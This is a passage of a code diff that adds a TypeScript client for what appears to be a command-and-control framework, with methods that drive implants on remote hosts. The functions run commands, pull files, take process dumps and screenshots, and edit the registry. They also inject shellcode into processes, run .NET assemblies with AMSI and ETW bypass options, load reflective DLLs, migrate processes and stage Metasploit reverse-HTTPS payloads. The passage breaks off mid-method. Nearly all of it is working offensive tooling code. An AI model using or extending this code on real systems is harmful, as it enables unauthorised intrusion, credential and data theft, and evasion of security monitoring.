+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.getEnv(
+        { Name: name, Request: this.beaconRequest(beaconId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  setEnvSession(
+    sessionId: string,
+    key: string,
+    value: string,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ): Promise<SetEnv> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.setEnv(
+        {
+          Variable: { Key: key, Value: value },
+          Request: this.sessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  setEnvBeacon(
+    beaconId: string,
+    key: string,
+    value: string,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ): Promise<SetEnv> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.setEnv(
+        {
+          Variable: { Key: key, Value: value },
+          Request: this.beaconRequest(beaconId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  unsetEnvSession(sessionId: string, name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<UnsetEnv> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.unsetEnv(
+        { Name: name, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  unsetEnvBeacon(beaconId: string, name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<UnsetEnv> {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.unsetEnv(
+        { Name: name, Request: this.beaconRequest(beaconId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  // --- Explicit M2 session workbench APIs ---
+
+  currentTokenOwnerSession(sessionId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.currentTokenOwner(
+        { Request: this.m4SessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  currentTokenOwnerBeacon(beaconId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.currentTokenOwner(
+        { Request: this.m4BeaconRequest(beaconId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  listEnvSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<EnvInfo> {
+    return this.getEnvSession(sessionId, "", timeoutSeconds);
+  }
+
+  revealEnvSession(sessionId: string, exactName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<EnvInfo> {
+    assertNonEmptyString(exactName, "Environment variable name");
+    return this.getEnvSession(sessionId, exactName, timeoutSeconds);
+  }
+
+  ifconfigSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.ifconfig(
+        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  netstatSession(
+    sessionId: string,
+    options: SessionNetstatOptions,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.netstat(
+        {
+          TCP: options.tcp,
+          UDP: options.udp,
+          IP4: options.ip4,
+          IP6: options.ip6,
+          Listening: options.listening,
+          Request: this.sessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  pwdSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.pwd(
+        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  cdSession(sessionId: string, path: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.cd(
+        { Path: path, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  lsSession(sessionId: string, path = ".", timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.ls(
+        { Path: path, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  downloadFileSession(
+    sessionId: string,
+    path: string,
+    options: SessionDownloadFileOptions = {},
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    const maxBytes = boundedArtifactByteCount(options.maxBytes);
+    const start = boundedNonNegativeInteger(options.start ?? 0, "Download start");
+    const stop = boundedNonNegativeInteger(options.stop ?? 0, "Download stop");
+    const maxLines = boundedNonNegativeInteger(options.maxLines ?? 0, "Download max lines");
+    const fromEnd = options.fromEnd ?? false;
+    if (typeof fromEnd !== "boolean") throw new Error("Download from-end must be a boolean");
+    if (fromEnd && (start !== 0 || stop !== 0 || maxLines !== 0)) {
+      throw new Error("Download from-end cannot be combined with start, stop, or max lines");
+    }
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const response = await this.workbenchArtifactRpc.download(
+        {
+          Path: path,
+          Start: String(start),
+          Stop: String(stop),
+          Recurse: false,
+          MaxBytes: String(fromEnd ? -maxBytes : maxBytes),
+          MaxLines: String(maxLines),
+          RestrictedToFile: true,
+          Request: this.sessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      );
+      try {
+        assertImplantResponse(response.Response?.Err, "Download");
+        if (!response.Exists || response.IsDir) {
+          throw new Error("Download is unavailable or is not a single file");
+        }
+        const data = await decodeBoundedArtifact(response.Data, response.Encoder, maxBytes, "Download");
+        return { ...response, Encoder: "", Data: data };
+      } catch (error) {
+        response.Data.fill(0);
+        throw error;
+      }
+    });
+  }
+
+  uploadSession(
+    sessionId: string,
+    path: string,
+    data: Buffer,
+    options: SessionUploadOptions = {},
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    assertBoundedArtifact(data, "Upload");
+    const ownedData = Buffer.from(data);
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      let payload: Buffer;
+      try {
+        payload = await gzip(ownedData);
+      } finally {
+        ownedData.fill(0);
+      }
+      try {
+        const response = await this.workbenchArtifactRpc.upload(
+          {
+            Path: path,
+            Encoder: "gzip",
+            Data: payload,
+            IsIOC: options.isIOC ?? false,
+            FileName: options.fileName ?? "",
+            IsDirectory: options.isDirectory ?? false,
+            Overwrite: options.overwrite ?? false,
+            Request: this.sessionRequest(sessionId, timeoutSeconds),
+          },
+          { signal },
+        );
+        return response;
+      } finally {
+        payload.fill(0);
+      }
+    }).finally(() => ownedData.fill(0));
+  }
+
+  grepSession(
+    sessionId: string,
+    path: string,
+    searchPattern: string,
+    options: SessionGrepOptions = {},
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    const linesBefore = boundedNonNegativeInt32(options.linesBefore ?? 0, "Grep lines before");
+    const linesAfter = boundedNonNegativeInt32(options.linesAfter ?? 0, "Grep lines after");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.grep(
+        {
+          SearchPattern: searchPattern,
+          Path: path,
+          Recursive: options.recursive ?? false,
+          LinesBefore: linesBefore,
+          LinesAfter: linesAfter,
+          Request: this.sessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  cpSession(sessionId: string, source: string, destination: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.cp(
+        { Src: source, Dst: destination, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  mvSession(sessionId: string, source: string, destination: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.mv(
+        { Src: source, Dst: destination, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  mkdirSession(sessionId: string, path: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.mkdir(
+        { Path: path, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  rmSession(
+    sessionId: string,
+    path: string,
+    recursive = false,
+    force = false,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.rm(
+        { Path: path, Recursive: recursive, Force: force, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  mountsSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.mount(
+        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  memfilesListSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.memfilesList(
+        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  memfilesAddSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.memfilesAdd(
+        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  memfilesRmSession(sessionId: string, fd: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.memfilesRm(
+        { Fd: fd, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  chmodSession(
+    sessionId: string,
+    path: string,
+    fileMode: string,
+    recursive = false,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.chmod(
+        { Path: path, FileMode: fileMode, Recursive: recursive, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  chownSession(
+    sessionId: string,
+    path: string,
+    uid: string,
+    gid: string,
+    recursive = false,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.chown(
+        { Path: path, Uid: uid, Gid: gid, Recursive: recursive, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  chtimesSession(
+    sessionId: string,
+    path: string,
+    accessTime: string,
+    modificationTime: string,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.chtimes(
+        { Path: path, ATime: accessTime, MTime: modificationTime, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  psSession(sessionId: string, fullInfo = false, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.ps(
+        { FullInfo: fullInfo, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  terminateSessionProcess(
+    sessionId: string,
+    pid: number,
+    force = false,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.terminate(
+        { Pid: pid, Force: force, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  processDumpSession(
+    sessionId: string,
+    pid: number,
+    dumpTimeoutSeconds = 60,
+    timeoutSeconds = dumpTimeoutSeconds + DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    const validatedDumpTimeout = boundedPositiveInt32(dumpTimeoutSeconds, "Process dump timeout");
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const response = await this.workbenchArtifactRpc.processDump(
+        {
+          Pid: pid,
+          Timeout: validatedDumpTimeout,
+          Request: this.sessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      );
+      try {
+        assertImplantResponse(response.Response?.Err, "Process dump");
+        assertBoundedArtifact(response.Data, "Process dump");
+        return response;
+      } catch (error) {
+        response.Data.fill(0);
+        throw error;
+      }
+    });
+  }
+
+  screenshotSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const response = await this.workbenchArtifactRpc.screenshot(
+        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      );
+      try {
+        assertImplantResponse(response.Response?.Err, "Screenshot");
+        assertBoundedArtifact(response.Data, "Screenshot");
+        return response;
+      } catch (error) {
+        response.Data.fill(0);
+        throw error;
+      }
+    });
+  }
+
+  servicesSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.services(
+        { Hostname: "", Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  serviceDetailSession(sessionId: string, serviceName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.serviceDetail(
+        {
+          ServiceInfo: { ServiceName: serviceName, Hostname: "" },
+          Request: this.sessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  startServiceSession(sessionId: string, serviceName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.startServiceByName(
+        {
+          ServiceInfo: { ServiceName: serviceName, Hostname: "" },
+          Request: this.sessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  stopServiceSession(sessionId: string, serviceName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.stopService(
+        {
+          ServiceInfo: { ServiceName: serviceName, Hostname: "" },
+          Request: this.sessionRequest(sessionId, timeoutSeconds),
+        },
+        { signal },
+      ),
+    );
+  }
+
+  registryReadSession(
+    sessionId: string,
+    hive: string,
+    path: string,
+    key: string,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.registryRead(
+        { Hive: hive, Path: path, Key: key, Hostname: "", Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  registryListSubkeysSession(
+    sessionId: string,
+    hive: string,
+    path: string,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.registryListSubKeys(
+        { Hive: hive, Path: path, Hostname: "", Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  registryListValuesSession(
+    sessionId: string,
+    hive: string,
+    path: string,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.registryListValues(
+        { Hive: hive, Path: path, Hostname: "", Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  registryReadHiveSession(
+    sessionId: string,
+    rootHive: string,
+    requestedHive: string,
+    maxBytes = WORKBENCH_ARTIFACT_MAX_PAYLOAD_BYTES,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    const boundedMaxBytes = boundedArtifactByteCount(maxBytes);
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const response = await this.workbenchArtifactRpc.registryReadHive(
+        { RootHive: rootHive, RequestedHive: requestedHive, Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      );
+      try {
+        assertImplantResponse(response.Response?.Err, "Registry hive read");
+        const data = await decodeBoundedArtifact(response.Data, response.Encoder, boundedMaxBytes, "Registry hive read");
+        return { ...response, Encoder: "", Data: data };
+      } catch (error) {
+        response.Data.fill(0);
+        throw error;
+      }
+    });
+  }
+
+  registryWriteSession(
+    sessionId: string,
+    hive: string,
+    path: string,
+    key: string,
+    value: SessionRegistryWriteValue,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    const fields = registryWriteFields(value);
+    const dispose = () => fields.ByteValue.fill(0);
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      try {
+        return await this.rpc.registryWrite(
+          {
+            Hive: hive,
+            Path: path,
+            Key: key,
+            Hostname: "",
+            ...fields,
+            Request: this.sessionRequest(sessionId, timeoutSeconds),
+          },
+          { signal },
+        );
+      } finally {
+        dispose();
+      }
+    }).finally(dispose);
+  }
+
+  registryCreateKeySession(
+    sessionId: string,
+    hive: string,
+    path: string,
+    key: string,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.registryCreateKey(
+        { Hive: hive, Path: path, Key: key, Hostname: "", Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  registryDeleteKeySession(
+    sessionId: string,
+    hive: string,
+    path: string,
+    key: string,
+    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.registryDeleteKey(
+        { Hive: hive, Path: path, Key: key, Hostname: "", Request: this.sessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  // --- Explicit M4 execution and privilege APIs ---
+
+  private executeTarget(request: CommonRequest, options: ExecuteOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.path, "Executable path");
+    const args = m4StringArray(options.args);
+    const background = options.background ?? false;
+    const output = !background && (options.output ?? true);
+    const stdout = options.stdoutPath ?? "";
+    const stderr = options.stderrPath ?? "";
+    const parentPid = boundedUint32(options.parentPid ?? 0, "Parent process id");
+    const useToken = options.useToken ?? false;
+    const hideWindow = options.hideWindow ?? false;
+    const windowsRequest = useToken || hideWindow || parentPid !== 0;
+
+    if (windowsRequest) {
+      if (options.envInheritance || Object.keys(options.env ?? {}).length > 0) {
+        throw new Error("Environment options cannot be combined with Windows execution modifiers");
+      }
+      const rpc = !request.Async && output ? this.workbenchArtifactRpc : this.rpc;
+      return withTimeoutSignal(timeoutSeconds, (signal) =>
+        rpc.executeWindows(
+          {
+            Path: options.path,
+            Args: args,
+            Output: output,
+            Stdout: stdout,
+            Stderr: stderr,
+            UseToken: useToken,
+            HideWindow: hideWindow,
+            Background: background,
+            PPid: parentPid,
+            Request: request,
+          },
+          { signal },
+        ),
+      );
+    }
+
+    const env = m4Environment(options.env);
+    const rpc = !request.Async && output ? this.workbenchArtifactRpc : this.rpc;
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      rpc.execute(
+        {
+          Path: options.path,
+          Args: args,
+          Output: output,
+          Stdout: stdout,
+          Stderr: stderr,
+          EnvInheritance: options.envInheritance ?? false,
+          Env: env,
+          Background: background,
+          PPid: 0,
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  executeSession(
+    sessionId: string,
+    options: ExecuteOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  executeBeacon(
+    beaconId: string,
+    options: ExecuteOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  executeChildrenSession(sessionId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.executeChildren(
+        { Request: this.m4SessionRequest(sessionId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  executeChildrenBeacon(beaconId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.executeChildren(
+        { Request: this.m4BeaconRequest(beaconId, timeoutSeconds) },
+        { signal },
+      ),
+    );
+  }
+
+  private executeAssemblyTarget(
+    request: CommonRequest,
+    assembly: Buffer,
+    options: ExecuteAssemblyOptions,
+    timeoutSeconds: number,
+  ) {
+    const isDll = options.isDll ?? false;
+    if (isDll && (!options.className?.trim() || !options.method?.trim())) {
+      throw new Error("DLL assembly execution requires a class name and method");
+    }
+    if (!options.inProcess && (options.runtime || options.amsiBypass || options.etwBypass)) {
+      throw new Error("Runtime, AMSI bypass, and ETW bypass require in-process assembly execution");
+    }
+
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedAssembly = m4ArtifactCopy(assembly, "Assembly");
+      try {
+        return await this.artifactRpc.executeAssembly(
+          {
+            Assembly: ownedAssembly,
+            Arguments: m4StringArray(options.arguments),
+            Process: options.process ?? "notepad.exe",
+            IsDLL: isDll,
+            Arch: options.arch ?? "x84",
+            ClassName: options.className ?? "",
+            Method: options.method ?? "",
+            AppDomain: options.appDomain ?? "",
+            PPid: boundedUint32(options.parentPid ?? 0, "Parent process id"),
+            ProcessArgs: options.processArgs === undefined ? [""] : m4StringArray(options.processArgs),
+            InProcess: options.inProcess ?? false,
+            Runtime: options.runtime ?? "",
+            AmsiBypass: options.amsiBypass ?? false,
+            EtwBypass: options.etwBypass ?? false,
+            Request: request,
+          },
+          { signal },
+        );
+      } finally {
+        ownedAssembly.fill(0);
+      }
+    });
+  }
+
+  executeAssemblySession(
+    sessionId: string,
+    assembly: Buffer,
+    options: ExecuteAssemblyOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeAssemblyTarget(
+      this.m4SessionRequest(sessionId, timeoutSeconds),
+      assembly,
+      options,
+      timeoutSeconds,
+    );
+  }
+
+  executeAssemblyBeacon(
+    beaconId: string,
+    assembly: Buffer,
+    options: ExecuteAssemblyOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeAssemblyTarget(
+      this.m4BeaconRequest(beaconId, timeoutSeconds),
+      assembly,
+      options,
+      timeoutSeconds,
+    );
+  }
+
+  private executeShellcodeTarget(
+    request: CommonRequest,
+    shellcode: Buffer,
+    options: ExecuteShellcodeOptions,
+    timeoutSeconds: number,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedShellcode = m4ArtifactCopy(shellcode, "Shellcode");
+      try {
+        return await this.artifactRpc.task(
+          {
+            Encoder: "",
+            RWXPages: options.rwxPages ?? false,
+            Pid: boundedUint32(options.pid ?? 0, "Shellcode process id"),
+            Data: ownedShellcode,
+            Request: request,
+          },
+          { signal },
+        );
+      } finally {
+        ownedShellcode.fill(0);
+      }
+    });
+  }
+
+  executeShellcodeSession(
+    sessionId: string,
+    shellcode: Buffer,
+    options: ExecuteShellcodeOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeShellcodeTarget(
+      this.m4SessionRequest(sessionId, timeoutSeconds),
+      shellcode,
+      options,
+      timeoutSeconds,
+    );
+  }
+
+  executeShellcodeBeacon(
+    beaconId: string,
+    shellcode: Buffer,
+    options: ExecuteShellcodeOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.executeShellcodeTarget(
+      this.m4BeaconRequest(beaconId, timeoutSeconds),
+      shellcode,
+      options,
+      timeoutSeconds,
+    );
+  }
+
+  private sideloadTarget(
+    request: CommonRequest,
+    data: Buffer,
+    options: SideloadOptions,
+    timeoutSeconds: number,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedData = m4ArtifactCopy(data, "Sideload library");
+      try {
+        return await this.artifactRpc.sideload(
+          {
+            Data: ownedData,
+            ProcessName: options.processName ?? "c:\\windows\\system32\\notepad.exe",
+            Args: m4StringArray(options.args),
+            EntryPoint: options.entryPoint ?? "",
+            Kill: !(options.keepAlive ?? false),
+            isDLL: options.isDll ?? false,
+            isUnicode: options.isUnicode ?? false,
+            PPid: boundedUint32(options.parentPid ?? 0, "Parent process id"),
+            ProcessArgs: options.processArgs === undefined ? [""] : m4StringArray(options.processArgs),
+            Request: request,
+          },
+          { signal },
+        );
+      } finally {
+        ownedData.fill(0);
+      }
+    });
+  }
+
+  sideloadSession(
+    sessionId: string,
+    data: Buffer,
+    options: SideloadOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.sideloadTarget(this.m4SessionRequest(sessionId, timeoutSeconds), data, options, timeoutSeconds);
+  }
+
+  sideloadBeacon(
+    beaconId: string,
+    data: Buffer,
+    options: SideloadOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.sideloadTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), data, options, timeoutSeconds);
+  }
+
+  private spawnDllTarget(
+    request: CommonRequest,
+    data: Buffer,
+    options: SpawnDllOptions,
+    timeoutSeconds: number,
+  ) {
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      const ownedData = m4ArtifactCopy(data, "Reflective DLL");
+      try {
+        return await this.artifactRpc.spawnDll(
+          {
+            Data: ownedData,
+            ProcessName: options.processName ?? "c:\\windows\\system32\\notepad.exe",
+            Args: m4StringArray(options.args),
+            EntryPoint: options.entryPoint ?? "ReflectiveLoader",
+            Kill: !(options.keepAlive ?? false),
+            PPid: 0,
+            ProcessArgs: [],
+            Request: request,
+          },
+          { signal },
+        );
+      } finally {
+        ownedData.fill(0);
+      }
+    });
+  }
+
+  spawnDllSession(
+    sessionId: string,
+    data: Buffer,
+    options: SpawnDllOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.spawnDllTarget(this.m4SessionRequest(sessionId, timeoutSeconds), data, options, timeoutSeconds);
+  }
+
+  spawnDllBeacon(
+    beaconId: string,
+    data: Buffer,
+    options: SpawnDllOptions = {},
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.spawnDllTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), data, options, timeoutSeconds);
+  }
+
+  getShellcodeEncoderMap(timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.shellcodeEncoderMap({}, { signal }));
+  }
+
+  private migrateTarget(request: CommonRequest, options: MigrateOptions, timeoutSeconds: number) {
+    const pid = boundedUint32(options.pid ?? 0, "Migration process id");
+    const processName = options.processName?.trim() ?? "";
+    if (pid === 0 && processName === "") {
+      throw new Error("Migration requires either a process id or process name");
+    }
+    const config = m4ImplantConfig(options.config);
+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
+      try {
+        return await this.rpc.migrate(
+          {
+            Pid: pid,
+            Config: config.value,
+            Encoder: options.encoder ?? ShellcodeEncoder.NONE,
+            Name: options.name,
+            ProcName: processName,
+            Request: request,
+          },
+          { signal },
+        );
+      } finally {
+        config.dispose();
+      }
+    }).finally(config.dispose);
+  }
+
+  migrateSession(
+    sessionId: string,
+    options: MigrateOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.migrateTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  migrateBeacon(
+    beaconId: string,
+    options: MigrateOptions,
+    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
+  ) {
+    return this.migrateTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  private msfTarget(request: CommonRequest, options: MsfOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.lhost, "Metasploit listen host");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.msf(
+        {
+          Payload: options.payload ?? "meterpreter_reverse_https",
+          LHost: options.lhost,
+          LPort: boundedPort(options.lport ?? 4444, "Metasploit listen port"),
+          Encoder: options.encoder ?? "",
+          Iterations: boundedInt32(options.iterations ?? 1, "Metasploit encoder iterations"),
+          Request: request,
+        },
+        { signal },
+      ),
+    );
+  }
+
+  msfSession(sessionId: string, options: MsfOptions, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return this.msfTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  msfBeacon(beaconId: string, options: MsfOptions, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
+    return this.msfTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
+  }
+
+  private msfRemoteTarget(request: CommonRequest, options: MsfRemoteOptions, timeoutSeconds: number) {
+    assertNonEmptyString(options.lhost, "Metasploit listen host");
+    return withTimeoutSignal(timeoutSeconds, (signal) =>
+      this.rpc.msfRemote(
+        {
+          Payload: options.payload ?? "meterpreter_reverse_https",
